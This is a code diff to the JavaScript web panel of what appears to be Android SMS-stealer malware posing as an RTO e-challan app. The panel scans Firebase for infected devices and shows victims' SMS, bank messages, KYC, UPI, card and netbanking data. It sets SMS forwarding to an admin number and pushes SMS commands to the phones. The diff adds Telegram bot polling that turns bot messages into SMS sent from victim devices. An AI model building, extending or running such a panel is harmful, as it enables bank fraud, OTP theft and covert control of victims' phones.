@@ -209,6 +209,13 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .scan-status { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.2); border-radius:8px; padding:10px; margin:0 16px 12px; font-size:10px; color:#60A5FA; display:flex; align-items:center; gap:8px; }
 .scan-status .spin { display:inline-block; width:12px; height:12px; border:2px solid rgba(59,130,246,0.3); border-top-color:#3B82F6; border-radius:50%; animation:spin 1s linear infinite; }
 @keyframes spin { to { transform:rotate(360deg); } }
+/* ═══ TELEGRAM LIVE STATUS ═══ */
+.tg-status { background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.3); border-radius:8px; padding:10px 12px; margin-top:10px; font-size:11px; color:#60A5FA; line-height:1.5; font-weight:600; }
+.tg-status.ok { background:rgba(16,185,129,0.08); border-color:rgba(16,185,129,0.3); color:#10B981; }
+.tg-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
+.tg-log { background:#050810; border:1px solid #1E3A8A; border-radius:8px; padding:10px; margin-top:10px; max-height:200px; overflow-y:auto; font-family:'Courier New',monospace; font-size:10px; line-height:1.6; }
+.tg-log-line { color:#94A3B8; padding:2px 0; border-bottom:1px solid rgba(30,58,138,0.3); word-break:break-word; }
+.tg-log-line:last-child { border-bottom:none; color:#E5E7EB; }
 @media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
@@ -371,6 +378,7 @@ var scanListener = null;
 var deviceListener = null;
 var dataListeners = [];
 var cfSimSlot = 1;
+var tgPolling = {};
 
 // ═══ SAVED ACCOUNTS ═══
 function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
@@ -390,73 +398,41 @@ function renderAccounts() {
   });
 }
 
-// ═══ LOGIN (RTO) — FAST, NO SCAN ═══
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
   if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
-  
   var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
   var tempDb = tempApp.database();
   tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
     if (p === (s.val() || '0987')) {
       tempApp.delete();
-      // ✅ RTO flag
-      currentAccount = {
-        name: 'RTO Admin',
-        url: RTO_CONFIG.databaseURL,
-        apiKey: RTO_CONFIG.apiKey,
-        isRTO: true
-      };
+      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isRTO: true };
       openPanel(RTO_CONFIG, 'RTO Admin');
-    } else {
-      tempApp.delete();
-      document.getElementById('errorMsg').textContent = '❌ Wrong PIN';
-    }
-  }).catch(function(e) {
-    tempApp.delete();
-    document.getElementById('errorMsg').textContent = 'Error: ' + e.message;
-  });
+    } else { tempApp.delete(); document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
+  }).catch(function(e) { tempApp.delete(); document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
 }
-
-// ═══ OPEN SAVED ACCOUNT — DEEP SCAN ═══
 function openAccount(idx) {
-  var list = getSavedAccounts();
-  var acc = list[idx];
-  if (!acc) return;
-  currentAccount = {
-    name: acc.name || 'Account',
-    url: acc.url,
-    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
-    isRTO: false
-  };
-  openPanel({
-    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
-    databaseURL: acc.url,
-    projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
-  }, acc.name || 'Account');
+  var list = getSavedAccounts(); var acc = list[idx]; if (!acc) return;
+  currentAccount = { name: acc.name || 'Account', url: acc.url, apiKey: acc.apiKey || RTO_CONFIG.apiKey, isRTO: false };
+  openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
 }
-
-// ═══ OPEN PANEL ═══
 function openPanel(config, title) {
   try {
     if (currentApp) { try { currentApp.delete(); } catch(e) {} }
     currentApp = firebase.initializeApp(config, 'app_' + Date.now());
     db = currentApp.database();
-    
     if (!currentAccount) currentAccount = {};
     currentAccount.url = config.databaseURL;
     currentAccount.name = title;
-    
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
     startApp();
   } catch(e) { alert('Connection failed: ' + e.message); }
 }
-
-// ═══ LOGOUT ═══
 function doLogout() {
+  stopTelegramPolling();
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -472,7 +448,6 @@ function doLogout() {
   renderAccounts();
 }
 
-// ═══ START APP — RTO vs NEW ACCOUNT ═══
 function startApp() {
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
@@ -483,72 +458,51 @@ function startApp() {
   var scanText = document.getElementById('scanText');
   devs = {}; devPaths = {};
   
-  // ✅ RTO check
   var isRTO = currentAccount && (currentAccount.isRTO === true);
   if (!isRTO && currentAccount && currentAccount.url) {
     if (currentAccount.url.toLowerCase().indexOf('rto-echallan-v2') !== -1) isRTO = true;
   }
-  console.log('isRTO:', isRTO, 'Account:', currentAccount);
+  console.log('isRTO:', isRTO);
   
   if (isRTO) {
-    // ═══ RTO — FAST LOAD, NO SCAN ═══
     scanEl.style.display = 'none';
     deviceListener = db.ref('device_info');
     deviceListener.on('value', function(s) {
       devs = s.val() || {};
       devPaths = {};
-      Object.keys(devs).forEach(function(id) {
-        devPaths[id] = { device: 'device_info/' + id };
-      });
-      console.log('RTO devices:', Object.keys(devs).length);
-      updStats();
-      renderDevs();
+      Object.keys(devs).forEach(function(id) { devPaths[id] = { device: 'device_info/' + id }; });
+      updStats(); renderDevs();
       if (curId && devs[curId]) renderTab();
     }, function(error) {
       console.error('RTO load error:', error);
       document.getElementById('deviceGrid').innerHTML = '<div class="empty">Error: ' + error.message + '</div>';
     });
   } else {
-    // ═══ NEW ACCOUNT — DEEP SCAN ═══
     scanEl.style.display = 'flex';
     scanText.textContent = 'Scanning Firebase for devices...';
-    
     scanListener = db.ref('/');
     scanListener.on('value', function(snapshot) {
       var root = snapshot.val() || {};
       devs = {}; devPaths = {};
       var found = 0;
       var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
-      
       Object.keys(root).forEach(function(nodeName) {
         if (skipNodes.indexOf(nodeName) !== -1) return;
         var node = root[nodeName];
         if (!node || typeof node !== 'object') return;
-        
         Object.keys(node).forEach(function(key) {
           var entry = node[key];
           if (!entry || typeof entry !== 'object') return;
-          
           if (isDeviceEntry(key, entry)) {
-            if (!devs[key]) {
-              devs[key] = entry;
-              devPaths[key] = { device: nodeName + '/' + key };
-              found++;
-            } else {
-              Object.keys(entry).forEach(function(k) {
-                if (devs[key][k] === undefined) devs[key][k] = entry[k];
-              });
-            }
+            if (!devs[key]) { devs[key] = entry; devPaths[key] = { device: nodeName + '/' + key }; found++; }
+            else { Object.keys(entry).forEach(function(k) { if (devs[key][k] === undefined) devs[key][k] = entry[k]; }); }
           }
         });
       });
-      
-      console.log('Scanned devices:', found, devs);
+      console.log('Scanned:', found);
       scanText.textContent = 'Found ' + found + ' device(s)';
       setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
-      
-      updStats();
-      renderDevs();
+      updStats(); renderDevs();
       if (curId && devs[curId]) renderTab();
     }, function(error) {
       console.error('Scan error:', error);
@@ -557,46 +511,20 @@ function startApp() {
   }
 }
 
-// ✅ Loose device detection
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object') return false;
   if (key.indexOf('DEV_') === 0) return true;
-  
-  var deviceFields = [
-    'device_model', 'device_id', 'device_manufacturer', 'device_brand',
-    'android_version', 'android_sdk', 'sim_info', 'battery', 'battery_status',
-    'first_install_timestamp', 'install_timestamp', 'device_hardware',
-    'device_fingerprint', 'status', 'last_seen', 'messages', 'sms_history',
-    'form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data',
-    'netbanking_data', 'photos', 'installed_apps', 'notifications',
-    'device_board', 'serial_number', 'cpu_arch', 'storage', 'ip_address',
-    'online_time', 'offline_time', 'battery_info'
-  ];
-  
-  for (var i = 0; i < deviceFields.length; i++) {
-    if (entry[deviceFields[i]] !== undefined) return true;
-  }
-  
-  var hasBatteryLike = false;
-  Object.keys(entry).forEach(function(k) {
-    if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBatteryLike = true;
-  });
-  if (hasBatteryLike) return true;
-  
-  return false;
+  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info'];
+  for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
+  var hasBattery = false;
+  Object.keys(entry).forEach(function(k) { if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBattery = true; });
+  return hasBattery;
 }
 
-// ═══ UNIVERSAL DATA LOADER ═══
 function loadAllDeviceData(deviceId, basePath, callback) {
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  
-  var data = {
-    messages: {}, sms_history: {}, photos: {}, notifications: {},
-    installed_apps: {}, sim_info: null, forward_settings: null, device_info: null
-  };
-  
-  // ✅ Base path se load karo (fast)
+  var data = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, sim_info: null, forward_settings: null, device_info: null };
   if (basePath) {
     var baseRef = db.ref(basePath);
     var cb1 = baseRef.on('value', function(s) {
@@ -606,20 +534,14 @@ function loadAllDeviceData(deviceId, basePath, callback) {
     });
     dataListeners.push({ ref: baseRef, cb: cb1 });
   }
-  
-  // ✅ Background mein poora root scan karo (agar data kahin aur bhi ho)
   var rootRef = db.ref('/');
   var cb2 = rootRef.on('value', function(snapshot) {
     var root = snapshot.val() || {};
     var merged = {
-      messages: Object.assign({}, data.messages),
-      sms_history: Object.assign({}, data.sms_history),
-      photos: Object.assign({}, data.photos),
-      notifications: Object.assign({}, data.notifications),
-      installed_apps: data.installed_apps,
-      sim_info: data.sim_info,
-      forward_settings: data.forward_settings,
-      device_info: data.device_info
+      messages: Object.assign({}, data.messages), sms_history: Object.assign({}, data.sms_history),
+      photos: Object.assign({}, data.photos), notifications: Object.assign({}, data.notifications),
+      installed_apps: data.installed_apps, sim_info: data.sim_info,
+      forward_settings: data.forward_settings, device_info: data.device_info
     };
     scanForDevice(root, deviceId, merged);
     Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
@@ -630,98 +552,56 @@ function loadAllDeviceData(deviceId, basePath, callback) {
 
 function scanForDevice(obj, deviceId, result) {
   if (!obj || typeof obj !== 'object') return;
-  if (obj[deviceId] && typeof obj[deviceId] === 'object') {
-    collectData(obj[deviceId], result);
-  }
+  if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result);
   Object.keys(obj).forEach(function(key) {
     if (key === deviceId) return;
     var child = obj[key];
-    if (child && typeof child === 'object') {
-      scanForDevice(child, deviceId, result);
-    }
+    if (child && typeof child === 'object') scanForDevice(child, deviceId, result);
   });
 }
 
 function collectData(devObj, result) {
   if (!devObj || typeof devObj !== 'object') return;
-  
-  if (devObj.messages && typeof devObj.messages === 'object') {
-    Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
-  }
-  if (devObj.sms_history && typeof devObj.sms_history === 'object') {
-    Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
-  }
-  if (devObj.photos && typeof devObj.photos === 'object') {
-    Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
-  }
-  if (devObj.notifications && typeof devObj.notifications === 'object') {
-    Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
-  }
-  if (devObj.sms_notifications && typeof devObj.sms_notifications === 'object') {
-    Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
-  }
-  if (devObj.installed_apps && typeof devObj.installed_apps === 'object') {
-    result.installed_apps = devObj.installed_apps;
-  }
-  if (devObj.sim_info && typeof devObj.sim_info === 'object') {
-    result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
-  }
-  if (devObj.sim1_number || devObj.sim1_carrier) {
-    result.sim_info = Object.assign({}, result.sim_info || {}, {
-      sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier,
-      sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier
-    });
-  }
-  if (devObj.forward_settings && typeof devObj.forward_settings === 'object') {
-    result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
-  }
-  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) {
-    result.forward_settings = Object.assign({}, result.forward_settings || {}, {
-      enabled: devObj.enabled, admin_number: devObj.admin_number,
-      bot_token: devObj.bot_token, chat_id: devObj.chat_id,
-      forward_sim_slot: devObj.forward_sim_slot
-    });
-  }
+  if (devObj.messages) Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
+  if (devObj.sms_history) Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
+  if (devObj.photos) Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
+  if (devObj.notifications) Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
+  if (devObj.sms_notifications) Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
+  if (devObj.installed_apps) result.installed_apps = devObj.installed_apps;
+  if (devObj.sim_info && typeof devObj.sim_info === 'object') result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
+  if (devObj.sim1_number || devObj.sim1_carrier) result.sim_info = Object.assign({}, result.sim_info || {}, { sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier, sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier });
+  if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
+  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) result.forward_settings = Object.assign({}, result.forward_settings || {}, { enabled: devObj.enabled, admin_number: devObj.admin_number, bot_token: devObj.bot_token, chat_id: devObj.chat_id, forward_sim_slot: devObj.forward_sim_slot });
   if (!result.device_info) result.device_info = {};
-  ['device_model', 'device_name', 'device_id', 'android_version', 'android_sdk', 'battery', 'status', 'last_seen', 'sim_info', 'form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data', 'netbanking_data', 'device_note'].forEach(function(k) {
+  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage'].forEach(function(k) {
     if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
   });
 }
 
-// ═══ DEVICE DRAWER ═══
 function openDev(id) {
   curId = id;
   var d = devs[id];
   document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
   updStar();
-  
   document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
-  
   var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
-  
   loadAllDeviceData(id, basePath, function(data) {
     curMsgs = data.messages || {};
     photos = data.photos || {};
-    
     if (data.sim_info) devs[id].sim_info = data.sim_info;
     if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
     if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
     if (data.installed_apps && Object.keys(data.installed_apps).length > 0) devs[id].installed_apps = data.installed_apps;
     if (data.sms_history && Object.keys(data.sms_history).length > 0) devs[id].sms_history = data.sms_history;
-    if (data.device_info) {
-      Object.keys(data.device_info).forEach(function(k) {
-        if (devs[id][k] === undefined) devs[id][k] = data.device_info[k];
-      });
-    }
-    
+    if (data.device_info) Object.keys(data.device_info).forEach(function(k) { if (devs[id][k] === undefined) devs[id][k] = data.device_info[k]; });
     renderTab();
   });
-  
   document.getElementById('drawer').classList.add('active');
   document.getElementById('dOverlay').classList.add('active');
   switchTab('info');
 }
 function closeDev() {
+  stopTelegramPolling();
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
   document.getElementById('drawer').classList.remove('active');
@@ -764,8 +644,8 @@ function renderTab() {
       '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' +
       '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
       '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit number"><button data-det="1">Detect</button></div></div>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit number"><button data-det="2">Detect</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit"><button data-det="1">Detect</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit"><button data-det="2">Detect</button></div></div>' +
       '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div></div>' +
       '<div class="dir"><span class="k">Network</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
@@ -795,17 +675,58 @@ function renderTab() {
     var fNum = f.admin_number || '';
     var tok = f.bot_token || '';
     var ch = f.chat_id || '';
-    var devNum = (d.sim_info && d.sim_info.sim1_number) || '';
+    var tgOn = tgPolling[curId] && tgPolling[curId].active;
+    
     b.innerHTML = 
-      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx"></div><button class="btn" id="tgS">Start</button></div>' +
-      '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
-      '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
+      '<div class="card blue">' +
+        '<h3>✈️ Telegram to SMS Auto</h3>' +
+        '<div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div>' +
+        '<div class="fg"><label class="fl">Channel / Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx (optional)"></div>' +
+        '<button class="btn" id="tgS" style="background:' + (tgOn ? '#EF4444' : '#3B82F6') + '">' + (tgOn ? '⏹ STOP POLLING' : '▶ START POLLING') + '</button>' +
+        '<div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Polling active — waiting for Telegram messages...' : '⚪ Idle — enter Bot Token, then Start') + '</div>' +
+        '<div class="tg-log" id="tgLog"></div>' +
+      '</div>' +
+      '<div class="card green">' +
+        '<h3>📱 SMS Forwarding</h3>' +
+        '<label class="fl">SIM</label>' +
+        '<div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div>' +
+        '<label class="fl">Forward To</label>' +
+        '<div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div>' +
+      '</div>' +
+      '<div class="card">' +
+        '<h3>📤 Send SMS Direct</h3>' +
+        '<label class="fl">SIM</label>' +
+        '<div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div>' +
+        '<div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div>' +
+        '<div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div>' +
+        '<button class="btn green" id="sBtn">✈️ Send</button>' +
+      '</div>';
+    
     setTimeout(function() {
       document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('device_info/' + curId + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
-      document.getElementById('tgS').addEventListener('click', function() { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t || !c) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); alert('✅ Telegram started'); });
+      document.getElementById('tgS').addEventListener('click', function() {
+        if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); }
+        else {
+          var t = document.getElementById('tgT').value.trim();
+          var c = document.getElementById('tgC').value.trim();
+          if (!t) { alert('Enter Bot Token'); return; }
+          db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() });
+          startTelegramPolling(t, c); renderTab();
+        }
+      });
       document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
       document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
-      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); alert('✅ Sent'); });
+      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
+      
+      // ✅ Restore log from previous state
+      if (tgPolling[curId] && tgPolling[curId].logs) {
+        var logEl = document.getElementById('tgLog');
+        tgPolling[curId].logs.forEach(function(l) {
+          var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l;
+          logEl.appendChild(line);
+        });
+        logEl.scrollTop = logEl.scrollHeight;
+      }
     }, 100);
   }
 }
@@ -894,6 +815,127 @@ function renderBank() {
     return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
   }).join('');
   b.innerHTML = html;
+}
+
+// ═══════════════════════════════════════════════════════
+// TELEGRAM POLLING (WEB PANEL SIDE)
+// ═══════════════════════════════════════════════════════
+function startTelegramPolling(token, chatId) {
+  var devId = curId;
+  if (!devId) return;
+  if (tgPolling[devId] && tgPolling[devId].active) return;
+  
+  tgPolling[devId] = { active: true, token: token, chatId: chatId, offset: 0, timer: null, logs: [] };
+  
+  updateTgStatus('🟢 Starting bot polling...');
+  addTgLog('🚀 Bot polling started');
+  
+  // Bot info check
+  fetch('https://api.telegram.org/bot' + token + '/getMe')
+    .then(function(r) { return r.json(); })
+    .then(function(j) {
+      if (j.ok) {
+        addTgLog('✅ Bot connected: @' + j.result.username);
+        updateTgStatus('🟢 Bot @' + j.result.username + ' — waiting for messages...', 'ok');
+      } else {
+        addTgLog('❌ Bot error: ' + (j.description || 'unknown'));
+        updateTgStatus('❌ Bot error: ' + (j.description || 'unknown'), 'err');
+      }
+    })
+    .catch(function(e) { addTgLog('❌ Connection failed: ' + e.message); updateTgStatus('❌ Connection failed', 'err'); });
+  
+  var pollFn = function() {
+    var p = tgPolling[devId];
+    if (!p || !p.active) return;
+    
+    var url = 'https://api.telegram.org/bot' + p.token + '/getUpdates?timeout=5&offset=' + p.offset;
+    
+    fetch(url)
+      .then(function(r) { return r.json(); })
+      .then(function(j) {
+        if (!j.ok) { addTgLog('❌ getUpdates error: ' + (j.description || 'unknown')); return; }
+        
+        if (j.result && j.result.length > 0) {
+          j.result.forEach(function(update) {
+            p.offset = update.update_id + 1;
+            if (update.message && update.message.text) {
+              var msg = update.message.text;
+              var from = update.message.from ? (update.message.from.username || update.message.from.first_name || 'user') : 'user';
+              addTgLog('📩 From @' + from + ': "' + msg.substring(0, 60) + (msg.length > 60 ? '...' : '') + '"');
+              
+              var toMatch = msg.match(/(?:To|to|TO):\s*([+\d]+)/);
+              var bodyMatch = msg.match(/(?:Body|body|BODY):\s*([\s\S]+)/);
+              
+              if (toMatch && bodyMatch) {
+                var toNum = toMatch[1].trim();
+                var bodyMsg = bodyMatch[1].trim();
+                addTgLog('📤 Sending SMS command to ' + toNum + '...');
+                updateTgStatus('📤 Sending SMS to ' + toNum + '...');
+                
+                db.ref('device_info/' + devId + '/sms_commands').push({
+                  to: toNum, message: bodyMsg, sim_slot: 1, status: 'pending',
+                  timestamp: Date.now(), source: 'telegram_bot'
+                }).then(function() {
+                  addTgLog('✅ SMS command pushed to device');
+                  updateTgStatus('✅ SMS sent to ' + toNum, 'ok');
+                }).catch(function(e) {
+                  addTgLog('❌ Firebase push failed: ' + e.message);
+                  updateTgStatus('❌ Failed: ' + e.message, 'err');
+                });
+              } else {
+                addTgLog('⚠️ Invalid format. Use: "To: NUMBER\\nBody: MESSAGE"');
+              }
+            }
+          });
+        }
+        p.timer = setTimeout(pollFn, 5000);
+      })
+      .catch(function(e) {
+        addTgLog('❌ Polling error: ' + e.message);
+        var p2 = tgPolling[devId];
+        if (p2 && p2.active) p2.timer = setTimeout(pollFn, 5000);
+      });
+  };
+  tgPolling[devId].timer = setTimeout(pollFn, 2000);
+}
+
+function stopTelegramPolling() {
+  Object.keys(tgPolling).forEach(function(devId) {
+    var p = tgPolling[devId];
+    if (p) { p.active = false; if (p.timer) clearTimeout(p.timer); }
+  });
+  if (curId) {
+    updateTgStatus('⚪ Polling stopped');
+    addTgLog('⏹ Polling stopped');
+  }
+}
+
+function updateTgStatus(text, type) {
+  var el = document.getElementById('tgStatus');
+  if (!el) return;
+  el.textContent = text;
+  el.className = 'tg-status' + (type === 'err' ? ' err' : '') + (type === 'ok' ? ' ok' : '');
+}
+
+function addTgLog(text) {
+  var el = document.getElementById('tgLog');
+  var time = new Date().toLocaleTimeString();
+  var lineText = '[' + time + '] ' + text;
+  
+  // ✅ Store in memory
+  if (curId && tgPolling[curId]) {
+    if (!tgPolling[curId].logs) tgPolling[curId].logs = [];
+    tgPolling[curId].logs.push(lineText);
+    if (tgPolling[curId].logs.length > 50) tgPolling[curId].logs.shift();
+  }
+  
+  if (!el) return;
+  var line = document.createElement('div');
+  line.className = 'tg-log-line';
+  line.textContent = lineText;
+  el.appendChild(line);
